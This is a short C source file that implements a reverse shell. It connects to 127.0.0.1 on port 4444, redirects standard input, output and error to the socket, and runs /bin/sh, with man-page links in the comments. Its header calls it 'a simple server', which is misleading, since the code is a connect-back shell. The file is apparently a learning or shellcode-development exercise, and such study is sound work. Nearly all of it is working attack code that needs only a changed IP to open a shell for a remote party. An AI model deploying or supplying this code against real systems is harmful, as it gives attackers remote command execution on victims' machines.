/* A simple server in the internet domain using TCP*/
	#include <stdio.h>
	#include <unistd.h>
	#include <sys/socket.h>
	#include <netinet/in.h>

	int main(void)
	{
		 int sockfd, portno; //file descriptor, client file descriptor, port number
		 socklen_t clilen; //socket length for new connections
		 
		 struct sockaddr_in serv_addr; //server listen address
		 
		 sockfd = socket(AF_INET, SOCK_STREAM, 0); //create TCP socket http://man7.org/linux/man-pages/man7/socket.7.html
		 portno = 4444; //port to listen on
		 serv_addr.sin_family = AF_INET; // server socket type address family = internet protocol address
		 serv_addr.sin_addr.s_addr = inet_addr("127.0.0.1"); // connect back IP address, converted to network byte order
		 serv_addr.sin_port = htons(portno); // server port, converted to network string order
		 connect(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)); //connect to socket http://man7.org/linux/man-pages/man2/connect.2.html

		 // dup2-loop to redirect stdin(0), stdout(1) and stderr(2)
		 dup2(sockfd, 0);
         dup2(sockfd, 1);
         dup2(sockfd, 2); //http://man7.org/linux/man-pages/man2/dup.2.html

		 // execute sh shell
		 execve("/bin/sh", NULL, NULL); //http://man7.org/linux/man-pages/man2/execve.2.html
		 
		 close(sockfd); //close socket

		 return 0; 
	}